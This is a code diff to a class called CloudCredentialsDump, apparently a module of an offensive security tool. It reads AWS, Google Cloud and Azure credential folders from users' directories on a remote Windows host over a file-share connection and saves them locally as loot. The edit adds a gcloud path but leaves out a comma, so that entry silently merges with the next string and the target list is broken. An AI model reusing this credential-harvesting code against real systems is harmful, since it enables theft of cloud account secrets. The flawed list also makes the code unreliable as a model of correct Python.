@@ -13,9 +13,11 @@ class CloudCredentialsDump:
     false_positive = [".", "..", "desktop.ini", "Public", "Default", "Default User", "All Users", ".NET v4.5", ".NET v4.5 Classic"]
     user_directories = [
         "Users\\{username}\\.aws",                                       # AWS credentials
-        "Users\\{username}\\AppData\\Roaming\\gcloud",                   # Google Clouds credentials
+        "Users\\{username}\\AppData\\Roaming\\gcloud",                   # Google Cloud credentials
+        "Users\\{username}\\.config\\gcloud\\"                           # Google Cloud credentials
         "Users\\{username}\\AppData\\Roaming\\Windows Azure Powershell", # Windows Azure Powershell
         "Users\\{username}\\.azure",                                     # Azure credentials
+            
     ]
     max_filesize = 5000000
 
@@ -46,14 +48,13 @@ class CloudCredentialsDump:
                     new_path = ntpath.join(directory_path, item.get_longname())
                     file_content = self.conn.readFile(self.context.share, new_path)
                     local_filepath = os.path.join(self.context.output_dir, *(new_path.split('\\')))
-                    # Stores the file in loot\TARGET\Users\{username}\AppData\
+
                     os.makedirs(os.path.dirname(local_filepath), exist_ok=True)
                     with open(local_filepath, "wb") as f:
                         if file_content is None:
                             file_content = b""
                         f.write(file_content)
                     
-                    # Stores files in loot\PowerShellHistory
                     os.makedirs(f"{self.context.output_dir}/../CloudCredentials", exist_ok=True)
                     local_filepath = os.path.join(
                         f"{self.context.output_dir}/../CloudCredentials", 
